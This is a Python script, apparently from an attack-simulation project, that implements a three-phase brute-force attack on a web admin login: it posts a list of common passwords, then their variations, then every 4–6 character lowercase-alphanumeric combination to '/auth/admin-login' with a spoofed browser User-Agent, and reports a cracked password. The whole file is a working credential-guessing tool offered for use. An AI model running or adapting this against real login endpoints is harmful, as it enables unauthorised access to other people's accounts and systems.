#!/usr/bin/env python3
"""
Smart Brute Force - Tries common passwords first, then brute force
Most realistic attack pattern
"""

import requests
import time
import random
import itertools
import os
from datetime import datetime
from colorama import Fore, Style

class BruteForceAttack:
    def __init__(self, target_url):
        self.target_url = target_url
        self.endpoint = f"{target_url}/auth/admin-login"
        self.results = []
        self.attempt_count = 0
        self.log_file = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), 
            "..", 
            "logs", 
            "bruteforce.log"
        )
        os.makedirs(os.path.dirname(self.log_file), exist_ok=True)
    
    def write_log(self, message):
        try:
            with open(self.log_file, 'a') as f:
                f.write(f"{message}\n")
        except:
            pass
    
    def try_login(self, username, password, i, total):
        """Attempt login with given credentials"""
        try:
            response = requests.post(
                self.endpoint,
                data={'username': username, 'password': password},
                timeout=5,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'
                }
            )
            
            status = "FAILED"
            color = Fore.RED
            
            if response.status_code == 302 or "Welcome Admin" in response.text:
                status = "SUCCESS!"
                color = Fore.GREEN
                print(Fore.GREEN + f"    ✓ CRACKED! Password: {password}")
                return True, status
            
            if i % 100 == 0:
                print(f"{Fore.YELLOW}[{i}/{total}] Testing: {password}")
            
            self.write_log(f"[{i}/{total}] {username} - {status} - {password}")
            return False, status
            
        except Exception as e:
            self.write_log(f"[{i}/{total}] ERROR: {str(e)}")
            return False, "ERROR"
    
    def load_common_passwords(self):
        """Load list of common passwords"""
        return [
            "123456", "admin123", "Administrator",
            "root", "toor", "welcome", "letmein", "admin", "password", "Admin@123",
            "adminpass", "admin2024", "admin2023", "admin!", "admin#",
            "password123", "passw0rd", "qwerty", "abc123", "12345678",
            "superuser", "poweruser", "system", "network", "secure",
            "security", "cyber", "tech", "company", "replicated",
            "admin01", "admin02", "admin001", "admin@2024", "Admin123"
        ]
    
    def execute(self, username="john.smith", max_attempts=1000, delay=0.01):
        """Execute smart brute force - common words first, then brute force"""
        print(Fore.RED + f"\n[+] Starting SMART BRUTE FORCE ATTACK")
        print(Fore.RED + f"    Target Admin: {username}")
        print(Fore.RED + f"    Max Attempts: {max_attempts}")
        print(Fore.RED + f"    Method: Common words first, then brute force\n")
        
        start_time = time.time()
        total_attempts = 0
        cracked = False
        found_password = None
        
        # PHASE 1: Try common passwords (fast)
        print(Fore.CYAN + "[Phase 1] Trying common passwords...")
        common_passwords = self.load_common_passwords()
        
        for password in common_passwords:
            if cracked:
                break
                
            total_attempts += 1
            if total_attempts > max_attempts:
                break
                
            success, status = self.try_login(username, password, total_attempts, max_attempts)
            if success:
                cracked = True
                found_password = password
                break
            
            time.sleep(delay)
        
        # PHASE 2: Try variations (if not cracked)
        if not cracked and total_attempts < max_attempts:
            print(Fore.CYAN + "\n[Phase 2] Trying variations of common passwords...")
            
            variations = []
            for p in common_passwords[:20]:
                variations.append(p + "123")
                variations.append(p + "2024")
                variations.append(p.upper())
                variations.append(p.capitalize())
                variations.append(p + "!")
                variations.append(p + "@")
            
            for password in variations:
                if cracked:
                    break
                    
                total_attempts += 1
                if total_attempts > max_attempts:
                    break
                    
                success, status = self.try_login(username, password, total_attempts, max_attempts)
                if success:
                    cracked = True
                    found_password = password
                    break
                
                time.sleep(delay)
        
        # PHASE 3: True brute force (if not cracked)
        if not cracked and total_attempts < max_attempts:
            print(Fore.CYAN + "\n[Phase 3] Trying true brute force combinations...")
            
            chars = "abcdefghijklmnopqrstuvwxyz0123456789"
            
            for length in range(4,7):
                if cracked or total_attempts > max_attempts:
                    break
                    
                print(Fore.YELLOW + f"  Length {length}: {len(chars)**length} combinations")
                
                for combo in itertools.product(chars, repeat=length):
                    if cracked or total_attempts > max_attempts:
                        break
                        
                    password = ''.join(combo)
                    total_attempts += 1
                    
                    success, status = self.try_login(
                        username, password, total_attempts, max_attempts
                    )
                    if success:
                        cracked = True
                        found_password = password
                        break
                    
                    time.sleep(delay)
        
        elapsed = time.time() - start_time
        
        print(Fore.CYAN + f"\n[+] Attack completed in {elapsed:.2f} seconds")
        print(Fore.CYAN + f"[+] Total attempts: {total_attempts}")
        print(Fore.CYAN + f"[+] Success: {cracked}")
        if cracked:
            print(Fore.GREEN + f"[+] Password found: {found_password}")
        
        return {
            'successful': cracked,
            'password': found_password,
            'attempts': total_attempts,
            'elapsed': elapsed
        }
    